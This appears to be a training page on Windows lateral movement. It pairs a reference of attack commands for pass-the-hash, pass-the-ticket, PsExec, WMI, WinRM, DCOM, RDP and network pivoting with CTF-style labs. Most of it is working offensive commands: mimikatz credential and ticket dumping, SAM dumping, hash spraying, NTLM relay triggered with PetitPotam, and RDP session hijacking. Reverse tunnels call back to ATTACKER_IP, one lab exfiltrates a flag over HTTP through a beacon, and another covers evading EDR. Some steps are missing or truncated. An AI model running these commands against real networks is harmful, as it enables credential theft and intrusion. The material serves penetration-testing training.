Lateral Movement

Pass-the-Hash (PtH)

Authenticate using the NTLM hash directly — no plaintext password required. Works because NTLM authentication uses the hash as the shared secret, never sending the raw password over the wire.

NTLM vs NTLMv2

ProtocolHash UsedPtH Viable?Notes
NTLM (NTLMv1)NT hash (MD4 of password)YesLegacy, weak — challenge-response based on NT hash
NTLMv2NT hash + challenge + timestampYesStronger challenge-response, but still uses the NT hash as base key
KerberosNT hash (for RC4) / AES keyNo (use Overpass-the-Hash)PtH doesn't apply — need to request a TGT instead

Key point: PtH works against any service using NTLM auth (SMB, WinRM, LDAP, MSSQL, RDP with Restricted Admin). You need the NT hash (32-char hex), not the NTLMv2 response hash captured from Responder.

Tools

# mimikatz — PtH to spawn a cmd.exe with target user's token
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe /run:cmd.exe"

# CrackMapExec / NetExec — PtH over SMB
nxc smb 10.10.10.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
nxc smb 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe -x "whoami"     # exec command
nxc smb 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe --sam           # dump SAM

# impacket-psexec — PtH to get SYSTEM shell
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe Administrator@10.10.10.10

# impacket-wmiexec — PtH via WMI (stealthier, no service creation)
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe Administrator@10.10.10.10

# pth-winexe — PtH from Linux
pth-winexe -U 'corp.local/Administrator%aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe' //10.10.10.10 cmd.exe

# evil-winrm — PtH over WinRM (port 5985)
evil-winrm -i 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe

Pass-the-Ticket (PtT)

Inject a stolen Kerberos ticket (TGT or TGS) into the current session to authenticate as the ticket's owner. No password or hash needed — just the ticket itself.

.kirbi vs .ccache

FormatPlatformUsed By
.kirbiWindowsmimikatz, Rubeus — base64-encoded or binary ticket
.ccacheLinuxImpacket — stored in KRB5CCNAME env variable

Export & Inject Tickets

# List cached tickets
klist

# mimikatz — export all tickets from memory
mimikatz.exe "sekurlsa::tickets /export"

# mimikatz — inject a .kirbi ticket
mimikatz.exe "kerberos::ptt ticket.kirbi"

# Rubeus — dump tickets (current user)
.\Rubeus.exe dump

# Rubeus — dump tickets (all users, needs elevation)
.\Rubeus.exe dump /service:krbtgt

# Rubeus — inject a ticket (base64)
.\Rubeus.exe ptt /ticket:doIFqDCCBaSgAwI...

# Rubeus — request a TGT with a hash and inject it
.\Rubeus.exe asktgt /user:admin /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
# Impacket — convert .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set the ticket for Impacket tools
export KRB5CCNAME=ticket.ccache

# Use the ticket
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
impacket-smbclient -k -no-pass corp.local/Administrator@dc01.corp.local

Overpass-the-Hash / Pass-the-Key

Convert an NTLM hash (or AES key) into a Kerberos TGT. Bridges PtH into Kerberos-only environments. The hash is used as pre-authentication to request a legitimate TGT from the KDC.

# mimikatz — request TGT using NTLM hash (spawns new session)
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:2b576acbe6bcfda7294d6bd18041b8fe /run:powershell.exe"

# Rubeus — request TGT with RC4 (NTLM hash) and inject
.\Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt

# Rubeus — request TGT with AES256 key (stealthier, avoids RC4 downgrade detection)
.\Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:a]8f2e9... /ptt /opsec
# Impacket — get TGT with hash, save as .ccache
impacket-getTGT corp.local/admin -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
export KRB5CCNAME=admin.ccache

# Now use Kerberos auth with any Impacket tool
impacket-psexec -k -no-pass corp.local/admin@dc01.corp.local

PsExec

Remote execution via SMB. Creates a service on the target, uploads an executable, runs it, and communicates over a named pipe.

How It Works

# Flow:
# 1. Authenticate to target via SMB (port 445)
# 2. Connect to ADMIN$ or C$ share → upload service binary
# 3. Open the Service Control Manager (SCManager) via RPC
# 4. Create and start a Windows service pointing to the uploaded binary
# 5. Service creates a named pipe for I/O (stdin/stdout)
# 6. Client connects to the named pipe → interactive shell
# 7. On exit: stops service, deletes service, removes binary

Tools

# impacket-psexec — returns SYSTEM shell
impacket-psexec corp.local/admin:Password123@10.10.10.10
impacket-psexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe admin@10.10.10.10

# impacket-smbexec — similar to psexec but uses a temporary batch file (no binary upload)
impacket-smbexec corp.local/admin:Password123@10.10.10.10
# Sysinternals PsExec (from Windows)
.\PsExec.exe \\10.10.10.10 -u corp\admin -p Password123 cmd.exe
.\PsExec.exe \\10.10.10.10 -u corp\admin -p Password123 -s cmd.exe   # run as SYSTEM
.\PsExec.exe \\10.10.10.10 -u corp\admin -p Password123 -i 1 cmd.exe # interactive session (session 1)

Detection: Event ID 7045 (new service installed), named pipe \PSEXESVC, binary in ADMIN$.

WMI (Windows Management Instrumentation)

Execute commands remotely via DCOM (port 135 + dynamic RPC ports). No service creation — stealthier than PsExec. Returns output via temporary files or named pipes.

# impacket-wmiexec — semi-interactive shell (runs cmd, reads output from ADMIN$ share)
impacket-wmiexec corp.local/admin:Password123@10.10.10.10
impacket-wmiexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe admin@10.10.10.10

# CrackMapExec / NetExec — WMI exec
nxc wmi 10.10.10.10 -u admin -p 'Password123' -x "whoami"
# wmic.exe (built-in, deprecated in newer Windows)
wmic /node:10.10.10.10 /user:corp\admin /password:Password123 process call create "cmd.exe /c whoami > C:\temp\out.txt"

# PowerShell — Invoke-WmiMethod
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName 10.10.10.10 -Credential $cred

# CIM (modern replacement for wmic)
$session = New-CimSession -ComputerName 10.10.10.10 -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}

WinRM (Windows Remote Management)

PowerShell remoting over HTTP/HTTPS (ports 5985/5986). Uses WS-Management protocol. Enabled by default on servers and can be enabled on workstations.

# evil-winrm — full-featured WinRM shell from Linux
evil-winrm -i 10.10.10.10 -u admin -p 'Password123'
evil-winrm -i 10.10.10.10 -u admin -H 2b576acbe6bcfda7294d6bd18041b8fe  # PtH
evil-winrm -i 10.10.10.10 -u admin -p 'Password123' -s /opt/scripts/    # load PS scripts
evil-winrm -i 10.10.10.10 -u admin -p 'Password123' -e /opt/tools/      # upload executables

# NetExec — WinRM
nxc winrm 10.10.10.10 -u admin -p 'Password123' -x "whoami"
# PowerShell — interactive session
$cred = Get-Credential
Enter-PSSession -ComputerName 10.10.10.10 -Credential $cred

# PowerShell — run command on remote machine
Invoke-Command -ComputerName 10.10.10.10 -Credential $cred -ScriptBlock { whoami; hostname }

# Run on multiple machines
Invoke-Command -ComputerName server01,server02,dc01 -Credential $cred -ScriptBlock { hostname }

# Enable WinRM on a target (needs local admin)
Enable-PSRemoting -Force

DCOM (Distributed COM)

Remote code execution through COM objects over RPC (port 135 + dynamic ports). Less commonly monitored than SMB-based methods.

# impacket-dcomexec — uses MMC20.Application by default
impacket-dcomexec corp.local/admin:Password123@10.10.10.10
impacket-dcomexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe admin@10.10.10.10

# Specify DCOM object
impacket-dcomexec -object MMC20 corp.local/admin:Password123@10.10.10.10
impacket-dcomexec -object ShellWindows corp.local/admin:Password123@10.10.10.10
impacket-dcomexec -object ShellBrowserWindow corp.local/admin:Password123@10.10.10.10
# PowerShell — MMC20.Application (lateral movement classic)
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\temp\out.txt", "7")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "10.10.10.10"))
$com.ShellExecute("cmd.exe", "/c whoami > C:\temp\out.txt", "C:\Windows\System32", $null, 0)

RDP (Remote Desktop Protocol)

Graphical remote access on port 3389. Legitimate admin tool often used for lateral movement.

# xfreerdp — RDP from Linux
xfreerdp /v:10.10.10.10 /u:admin /p:'Password123' /d:corp.local
xfreerdp /v:10.10.10.10 /u:admin /p:'Password123' /d:corp.local /dynamic-resolution /drive:share,/tmp

# Restricted Admin mode — PtH over RDP (no password sent to target)
# Must be enabled on target: HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0
xfreerdp /v:10.10.10.10 /u:admin /pth:2b576acbe6bcfda7294d6bd18041b8fe /d:corp.local

# Enable Restricted Admin mode remotely (requires existing shell)
nxc smb 10.10.10.10 -u admin -H 2b576acbe6bcfda7294d6bd18041b8fe -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
# SharpRDP — RDP command execution without GUI
.\SharpRDP.exe computername=10.10.10.10 command="cmd.exe /c whoami > C:\temp\out.txt" username=corp\admin password=Password123

# Enable RDP via registry (needs remote access already)
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

Pivoting

Route traffic through a compromised host to reach networks not directly accessible from your attack machine.

Chisel

# Chisel — fast TCP/UDP tunnel over HTTP
# On attack machine (server):
chisel server --reverse --port 8080

# On compromised host (client) — reverse SOCKS proxy:
chisel client ATTACKER_IP:8080 R:socks

# Creates a SOCKS5 proxy on attacker's port 1080
# Use with proxychains:
proxychains nxc smb 172.16.1.0/24 -u admin -p 'Password123'

# Specific port forward:
chisel client ATTACKER_IP:8080 R:8888:172.16.1.10:445

Ligolo-ng

# On attack machine — create TUN interface and start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On compromised host — connect back as agent
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo proxy console:
session                              # select the agent session
ifconfig                             # view agent's network interfaces
start                                # start the tunnel

# On attack machine — add route to internal network
sudo ip route add 172.16.1.0/24 dev ligolo

SSH Tunnels

# Local port forward: access remote_target:port through pivot
ssh -L 8888:172.16.1.10:445 user@pivot_host
# Now connect to localhost:8888 → reaches 172.16.1.10:445

# Remote port forward: expose attacker service to pivot's network
ssh -R 9090:127.0.0.1:80 user@pivot_host
# pivot_host:9090 → routes to attacker's localhost:80

# Dynamic (SOCKS) proxy
ssh -D 1080 user@pivot_host
# All traffic through SOCKS5 on localhost:1080 goes via pivot_host

# Combine with ProxyChains
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 172.16.1.0/24

sshuttle

# Route entire subnet through pivot (transparent proxy, needs Python on pivot)
sshuttle -r user@pivot_host 172.16.1.0/24

# With SSH key
sshuttle -r user@pivot_host --ssh-cmd "ssh -i id_rsa" 172.16.1.0/24

# Multiple subnets
sshuttle -r user@pivot_host 172.16.1.0/24 10.10.20.0/24

ProxyChains

# /etc/proxychains4.conf
# strict_chain or dynamic_chain
# [ProxyList]
# socks5 127.0.0.1 1080

# Usage — prefix any command
proxychains nmap -sT -Pn -p 445,3389,5985 172.16.1.0/24
proxychains evil-winrm -i 172.16.1.10 -u admin -p 'Password123'
proxychains impacket-psexec admin:Password123@172.16.1.10

Abuse legitimate Windows binaries to download files, execute code, or bypass application whitelisting. Reference: lolbas-project.github.io

Labs

Lab 1: Pass-the-Hash with CrackMapExec

Easy

Objective: Use a dumped NTLM hash to authenticate across the network with CrackMapExec/NetExec, enumerate accessible hosts, and execute commands.

# Scenario:
#   You compromised a workstation and dumped the local admin hash:
#   Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
#   Network: 10.10.10.0/24
#   Goal: Find other machines where this hash is valid and get code execution

# Step 1: Spray the hash across the subnet
nxc smb 10.10.10.0/24 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe

# Step 2: Look for (Pwn3d!) in the output — indicates admin access

Tasks:

  1. Spray the hash across the subnet and identify hosts where you have admin access
  2. Execute whoami on each pwned host: nxc smb TARGET -u Administrator -H HASH -x "whoami"
  3. Dump SAM hashes from a target: nxc smb TARGET -u Administrator -H HASH --sam
  4. List shares on accessible hosts: nxc smb TARGET -u Administrator -H HASH --shares

Lab 4: Impacket-PSExec Deep Dive

Easy

Objective: Understand and use impacket-psexec with passwords, hashes, and Kerberos tickets for remote execution.

# Method 1: Password authentication
impacket-psexec corp.local/Administrator:'P@ssw0rd'@10.10.10.10

# Method 2: Pass-the-Hash
impacket-psexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe Administrator@10.10.10.10

# 1. Connects to ADMIN$ share (\\target\ADMIN$)
# 2. Uploads a service binary (random name)

# 5. Connects to the pipe for interactive shell
# 6. Stops/deletes service and binary on exit

Tasks:

  2. Repeat with PtH — verify you get the same result.

Lab 5: Impacket-WMIExec for Stealth

Medium

Objective: Use WMI-based execution for stealthier lateral movement — no service creation, no binary upload.

# WMIExec: executes commands via WMI (DCOM port 135 + dynamic high port)
# More stealthy than PSExec — no service creation, no binary dropped

# Interactive shell
impacket-wmiexec corp.local/admin:'Password123'@10.10.10.10

# Pass-the-Hash
impacket-wmiexec -hashes :NTLM_HASH Administrator@10.10.10.10

# Single command execution
impacket-wmiexec -hashes :NTLM_HASH Administrator@10.10.10.10 "whoami /all"

# How WMIExec works:
# 1. Connects via DCOM (port 135 → dynamic port)
# 2. Creates a Win32_Process via WMI
# 3. Redirects output to a temp file on ADMIN$ share
# 4. Reads the output file and deletes it
# No service created — less forensic artifacts
# Compare with other WMI methods:
# impacket-dcomexec — uses different DCOM objects (ShellWindows, MMC20)
impacket-dcomexec -object ShellWindows corp.local/admin:'Password123'@10.10.10.10

# impacket-atexec — uses Task Scheduler (less common, different artifacts)
impacket-atexec corp.local/admin:'Password123'@10.10.10.10 "whoami"

Tasks:

  1. Get a shell using wmiexec. Compare the artifacts with psexec (no service, no binary).
  2. Test dcomexec with different DCOM objects — which work depends on the target config.
  3. Use atexec for one-shot command execution via scheduled tasks.
  4. Monitor network traffic: identify the DCOM negotiation on port 135.

Lab 9: SSH Port Forwarding

Medium

Objective: Use SSH local, remote, and dynamic port forwarding for pivoting when SSH is available on the pivot host.

ssh -L 4445:172.16.1.10:445 -L 5985:172.16.1.10:5985 -D 1080 user@pivot_host

sshuttle -r user@pivot_host 172.16.1.0/24 --dns

Tasks:

  1. Set up a local port forward to access an internal SMB share.
  2. Set up a dynamic port forward (SOCKS5) and scan the internal network via proxychains.

Challenge 1: The Hash Relay

Easy

You've compromised a workstation and extracted the local admin NTLM hash. The flag is in C:\flag.txt on a second machine (10.10.10.20) that reuses the same local admin password.

# Environment:
#   Compromised host: 10.10.10.10
#   Target: 10.10.10.20
#   Dumped hash: Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

# Use the hash to move laterally and read the flag

2. Get a shell: impacket-psexec -hashes :64f12cddaa88057e06a81b54e73b949b Administrator@10.10.10.20

Challenge 2: Through the Tunnel

Medium

You have a shell on a perimeter server (10.10.10.50). An internal host at 172.16.1.100 has a web service on port 8080 with a flag. The internal network is not directly routable from your machine.

# Environment:
#   Attacker: 192.168.1.100
#   Pivot host: 10.10.10.50 (external: 10.10.10.50 / internal: 172.16.1.50)
#   Target: 172.16.1.100:8080 — web service with flag
#   Pivot creds: user / Pivot2024!

# Reach the internal web service and retrieve the flag

Option A — SSH tunnel:
ssh -L 8080:172.16.1.100:8080 user@10.10.10.50
Then browse to http://localhost:8080.

Option B — Chisel:
Attacker: chisel server --reverse --port 9090
Pivot: chisel client 192.168.1.100:9090 R:socks
Then: proxychains curl http://172.16.1.100:8080

Then: curl http://172.16.1.100:8080

Challenge 3: Full Chain — From the Outside In

Hard

Starting from an external network with no credentials, gain initial access to the DMZ, escalate privileges, pivot into the corporate network, and read the flag from the Domain Controller.

# Environment:
#   External: 10.10.10.0/24
#   DMZ: 172.16.1.0/24 (reachable only from 10.10.10.0/24)
#   Corporate: 172.16.2.0/24 (reachable only from 172.16.1.0/24)
#   DC: 172.16.2.10 — flag in C:\Users\Administrator\Desktop\flag.txt
#
# Attack stages:
#   1. Scan 10.10.10.0/24 → find web server with RCE vulnerability
#   2. Get shell on DMZ web server → escalate to root/admin
#   3. Pivot to 172.16.1.0/24 → find a Windows workstation
#   4. Dump credentials → PtH to reach DC in 172.16.2.0/24
#   5. Read the flag

# Start
nmap -sT -Pn -p 80,443,445,3389 10.10.10.0/24

Stage 1 — Initial Access: Scan reveals a web server at 10.10.10.30:80. Exploit an RCE vuln (command injection, file upload, deserialization) to get a shell.
Stage 2 — Privesc: Enumerate with linpeas/winpeas. Find stored credentials or a kernel exploit. Escalate to root/SYSTEM.
Stage 3 — First Pivot: Set up chisel or ligolo-ng on the DMZ host. Route traffic to 172.16.1.0/24. Scan and find a Windows workstation at 172.16.1.20 with SMB open.
Stage 4 — Credential Harvest: Through proxychains, use nxc to test found creds on 172.16.1.20. Get a shell, run mimikatz, dump NTLM hashes. Find a domain admin hash.
Stage 5 — Double Pivot: Set up a second tunnel from 172.16.1.20 to reach 172.16.2.0/24. PtH with the domain admin hash to the DC: proxychains impacket-psexec -hashes :DA_HASH Administrator@172.16.2.10
Stage 6: type C:\Users\Administrator\Desktop\flag.txt

Challenge 4: Pivot Through the Network

Medium

You've compromised a web server at 10.10.10.30. An internal database at 172.16.1.50 has the flag on port 3306 (MySQL). The internal network is only reachable from the web server.

# Environment:
#   Attacker: 192.168.1.100
#   Web server: 10.10.10.30 (SSH access: webadmin / W3bAdmin!)
#   Internal: 10.10.10.30 has second NIC at 172.16.1.30
#   Target: 172.16.1.50:3306 (MySQL, creds: dbuser / DbPass123)
#
# The flag is in the "secrets" table of the "ctf" database

Set up a local port forward: ssh -L 3306:172.16.1.50:3306 webadmin@10.10.10.30. Then connect to MySQL via localhost: mysql -h 127.0.0.1 -u dbuser -p'DbPass123' ctf -e "SELECT * FROM secrets". Alternative: use chisel or ligolo-ng for a full SOCKS proxy to access the entire 172.16.1.0/24 network.

Challenge 5: Multi-Hop Tunneling

Hard

The flag is three network hops away. Pivot through two intermediate hosts to reach the final target. No single host can reach the flag directly.

# Network topology:
#   Attacker → Host A (10.10.10.20) → Host B (172.16.1.20) → Target (192.168.100.10)
#
#   Host A creds: user_a / PassA!  (has NIC on 10.10.10.0/24 + 172.16.1.0/24)
#   Host B creds: user_b / PassB!  (has NIC on 172.16.1.0/24 + 192.168.100.0/24)
#   Target: 192.168.100.10 — flag at C:\flag.txt (SMB share, creds: admin / FinalPass!)
#
# Build a chain of tunnels to reach the target

Chisel chain: Attacker: chisel server --reverse -p 8080. Host A: chisel client ATTACKER:8080 R:socks + chisel server --reverse -p 9090 --socks5. Host B (through proxychains): proxychains chisel client HOST_A_INTERNAL:9090 R:1081:socks. Configure proxychains with two SOCKS proxies chained. SSH approach: ssh -J user_a@10.10.10.20 user_b@172.16.1.20 -L 4445:192.168.100.10:445 (ProxyJump for multi-hop). Then smbclient //localhost:4445/C$ -U admin.

Challenge 6: Credential Relay Race

Medium

Two servers on the network have SMB signing disabled. Capture and relay authentication from one to the other. The relayed session gives you access to a share containing the flag.

# Environment:
#   Attacker: 192.168.1.100
#   Server A: 10.10.10.40 (will initiate auth — you can trigger via PetitPotam)
#   Server B: 10.10.10.50 (SMB signing disabled — relay target)
#   Server A's machine account has read access to \\Server_B\secrets share
#
# Relay A's authentication to B and read the flag from the share

Start ntlmrelayx targeting Server B: impacket-ntlmrelayx -t smb://10.10.10.50 -smb2support -socks. Trigger Server A to authenticate to you: python3 PetitPotam.py 192.168.1.100 10.10.10.40. Server A's machine account auth is relayed to Server B. Use the SOCKS session: proxychains smbclient //10.10.10.50/secrets -U 'CORP/SERVER_A$'. Read the flag from the share.

Medium

PSExec and WMI are blocked by the firewall. Only DCOM (port 135 + dynamic ports) is allowed. Use DCOM to execute a command on the target and read the flag.

# Environment:
#   Target: 10.10.10.10
#   Creds: corp\admin / Admin2024!

#   Port 5985 is BLOCKED (no WinRM)

Challenge 8: RDP Session Hijacking

Hard

You have SYSTEM on a server. A Domain Admin has a disconnected RDP session. Hijack their session and read the flag from their desktop.

# You have: SYSTEM shell on 10.10.10.10
# Enumerate sessions
query user
# USERNAME     SESSIONNAME   ID  STATE
# da_admin                    3  Disc
# your_user   rdp-tcp#5      5  Active
#
# The DA has a disconnected session (ID 3)
# Flag: open on their desktop in a notepad window

As SYSTEM, use tscon to hijack the disconnected session: tscon 3 /dest:rdp-tcp#5. This redirects session 3 (da_admin) to your RDP session. Challenge 9: C2 Beacon Deployment

Hard

Deploy a simple C2 beacon on an internal host through a pivot. The beacon must call back through the tunnel to your attacker machine. The flag is returned in the beacon's first callback.

# Environment:
#   Attacker: 192.168.1.100
#   Pivot: 10.10.10.30 (compromised, SSH access)
#   Internal target: 172.16.1.20 (Windows, WinRM open)
#   Target creds: corp\svc_app / AppSvc2024!
#
# Challenge: Deploy a PowerShell beacon that calls back to your HTTP listener
# The beacon must traverse: Internal → Pivot → Attacker
# Flag is in the environment variable FLAG on the target

Set up a reverse port forward so the internal host can reach your listener: ssh -R 8443:localhost:8443 user@10.10.10.30. Start an HTTP listener on your machine (port 8443). Connect to the target via the pivot: proxychains evil-winrm -i 172.16.1.20 -u svc_app -p 'AppSvc2024!'. On the target, run: $flag = $env:FLAG; Invoke-WebRequest -Uri "http://10.10.10.30:8443/$flag" -UseBasicParsing. The flag arrives at your HTTP listener in the URL path. The callback routes: target → pivot (port 8443) → SSH tunnel → attacker.

Challenge 10: LOLBAS Lateral Movement

Medium

All offensive tools (psexec, mimikatz, evil-winrm) are blocked by the EDR. Use only Living Off The Land Binaries and Scripts (LOLBAS) to move laterally and read the flag on the target.

# Environment:
#   Source: Your compromised workstation (domain-joined)
#   Target: 10.10.10.20 (file server, you have admin creds)
#   Creds: corp\admin / Admin123!
#   EDR blocks: psexec, mimikatz, cobalt strike, evil-winrm, ncat, chisel
#   Flag: C:\Shares\Confidential\flag.txt on the target
#
# Only built-in Windows tools are available

LOLBAS approaches: (1) WinRM (built-in): Enter-PSSession -ComputerName 10.10.10.20 -Credential (Get-Credential), then type C:\Shares\Confidential\flag.txt. (2) WMI: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c type C:\Shares\Confidential\flag.txt > C:\temp\out.txt" -ComputerName 10.10.10.20 -Credential $cred, then read the output via SMB. (3) PsExec (Sysinternals, often not flagged): .\PsExec.exe \\10.10.10.20 -u admin -p Admin123! cmd /c type C:\Shares\Confidential\flag.txt. (4) schtasks: Create a remote scheduled task that reads the flag.
